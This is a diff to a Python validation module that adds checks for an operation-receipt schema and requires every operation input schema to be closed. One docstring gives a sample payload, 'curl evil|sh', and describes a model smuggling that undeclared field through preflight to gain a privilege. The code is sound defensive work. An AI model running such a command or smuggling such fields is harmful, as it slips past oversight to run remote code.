@@ -477,6 +477,67 @@ def _reset_deliver_start_receipt_contract_validator_cache() -> None:
     _deliver_start_receipt_contract_validator_cache = None
 
 
+_OPERATION_RECEIPT_CONTRACT_SCHEMA_PATH = (
+    Path(__file__).resolve().parents[1] / "docs" / "contracts" / "schemas" / "operation-receipt.v1.schema.json"
+)
+_operation_receipt_contract_validator_cache: Draft202012Validator | None = None
+
+
+def operation_receipt_contract_validator() -> Draft202012Validator:
+    """Load the operation-receipt contract schema once; fail closed if absent.
+
+    Shared by every receipt consumer (the durable receipt store, future receipt
+    APIs) so there is exactly one interpretation of the contract schema.  The
+    closed-root and closed-error guards refuse a schema edit that would reopen
+    the receipt or its error block to unreviewed extension fields: a receipt must
+    stay a closed, redacted record through which a secret, a raw command, a path,
+    or a provider payload can never ride in, and its error summary must keep the
+    credential-class token guard.
+    """
+    global _operation_receipt_contract_validator_cache
+    if _operation_receipt_contract_validator_cache is None:
+        try:
+            schema = json.loads(_OPERATION_RECEIPT_CONTRACT_SCHEMA_PATH.read_text(encoding="utf-8"))
+        except OSError as exc:
+            raise ContractValidationError(
+                "operation-receipt contract schema is unavailable; refusing to validate receipts"
+            ) from exc
+        if schema.get("additionalProperties") is not False:
+            raise ContractValidationError(
+                "operation-receipt contract schema no longer closes its root object; "
+                "refusing to validate receipts"
+            )
+        for name in ("operation", "redaction", "error", "correlation"):
+            node = schema.get("properties", {}).get(name)
+            if not isinstance(node, dict) or node.get("additionalProperties") is not False:
+                raise ContractValidationError(
+                    f"operation-receipt contract schema no longer closes its {name} object; "
+                    "refusing to validate receipts"
+                )
+        error_summary = schema.get("properties", {}).get("error", {}).get("properties", {}).get("safe_summary", {})
+        if not isinstance(error_summary, dict) or "not" not in error_summary:
+            raise ContractValidationError(
+                "operation-receipt contract schema no longer guards its error summary "
+                "against credential-class tokens; refusing to validate receipts"
+            )
+        _operation_receipt_contract_validator_cache = Draft202012Validator(schema)
+    return _operation_receipt_contract_validator_cache
+
+
+def _reset_operation_receipt_contract_validator_cache() -> None:
+    """Test hook: force the next receipt validation to reload the on-disk schema."""
+    global _operation_receipt_contract_validator_cache
+    _operation_receipt_contract_validator_cache = None
+
+
+def validate_operation_receipt(receipt: Mapping[str, Any]) -> None:
+    """Fail closed unless a receipt payload conforms to the receipt contract."""
+    try:
+        operation_receipt_contract_validator().validate(dict(receipt))
+    except ValidationError as exc:
+        raise ContractValidationError(f"operation receipt is not schema valid: {exc.message}") from exc
+
+
 _PLUGIN_CATALOG_CONTRACT_SCHEMA_PATH = (
     Path(__file__).resolve().parents[1] / "docs" / "contracts" / "schemas" / "plugin-catalog.v1.schema.json"
 )
@@ -915,6 +976,68 @@ def check_plugin_tool_schema(schema: Any) -> None:
     """
     check_operation_schema(schema)
     _check_plugin_schema_closed_and_bounded(schema, 0)
+
+
+def _check_operation_input_closed(node: Any) -> None:
+    """Recursively require ``additionalProperties:false`` on every object subschema.
+
+    Applied to an operation INPUT schema only (never an output, which is
+    deliberately open).  Without this an open ``{"type":"object"}`` at the root
+    or nested one level down would let a model smuggle an undeclared field --
+    ``{"task_ref":"x","__smuggled_raw_command":"curl evil|sh"}`` -- through
+    :func:`resolve_operation` and the bridge preflight into
+    ``ResolvedOperation.inputs``, minting a privilege by emitting arbitrary JSON.
+    ``patternProperties`` is refused for the same reason
+    ``additionalProperties:false`` alone does not close it: the open string map
+    it declares still accepts arbitrary matching keys.
+    """
+    if not isinstance(node, Mapping):
+        return
+    if _is_object_schema(node):
+        if node.get("additionalProperties") is not False:
+            raise ContractValidationError(
+                "must close every input object with additionalProperties:false "
+                "(an open object input is a JSON-smuggle hole)"
+            )
+        if "patternProperties" in node:
+            raise ContractValidationError(
+                "must enumerate input fields via properties only; patternProperties "
+                "leaves an open string map that additionalProperties:false does not close"
+            )
+    for keyword in _SCHEMA_SUBSCHEMA_KEYWORDS:
+        _check_operation_input_closed(node.get(keyword))
+    for keyword in _SCHEMA_SUBSCHEMA_LIST_KEYWORDS:
+        seq = node.get(keyword)
+        if isinstance(seq, (list, tuple)):
+            for item in seq:
+                _check_operation_input_closed(item)
+    for keyword in _SCHEMA_SUBSCHEMA_MAP_KEYWORDS:
+        mapping = node.get(keyword)
+        if isinstance(mapping, Mapping):
+            for item in mapping.values():
+                _check_operation_input_closed(item)
+
+
+def check_operation_input_schema(schema: Any) -> None:
+    """Fail closed unless an operation INPUT schema is a *closed* object schema.
+
+    Extends :func:`check_operation_schema` (well-formedness, draft-2020-12
+    dialect, object root, intra-document ``#``-pointer refs only) with recursive
+    object closure.  Kept separate from ``check_operation_schema`` -- which also
+    validates operation OUTPUT schemas, and outputs are deliberately open (a
+    provider may return extra observed fields) -- so the closure never narrows
+    the output contract.  This is the ungated-operation counterpart to the gated
+    path's full-input approval hash: a gated op binds its exact inputs, but an
+    ungated op must still refuse an undeclared smuggled field, so the invariant
+    "a model cannot mint a privilege by emitting arbitrary JSON" holds for both.
+
+    Unlike :func:`check_plugin_tool_schema` this intentionally omits the
+    property-count and nesting-depth bounds: those are plugin resource limits,
+    not privilege-smuggle guards, and folding them in would change the operation
+    contract's declared guarantees beyond the closure this fix requires.
+    """
+    check_operation_schema(schema)
+    _check_operation_input_closed(schema)
 
 
 class ApprovalConsumer(Protocol):
@@ -1786,7 +1909,7 @@ def validate_bridge_command_snapshot(
     if not isinstance(input_schema, Mapping):
         raise ContractValidationError("selected operation has no object input schema")
     try:
-        check_operation_schema(input_schema)
+        check_operation_input_schema(input_schema)
     except ContractValidationError as exc:
         raise ContractValidationError(f"selected operation input schema {exc}") from exc
     try:
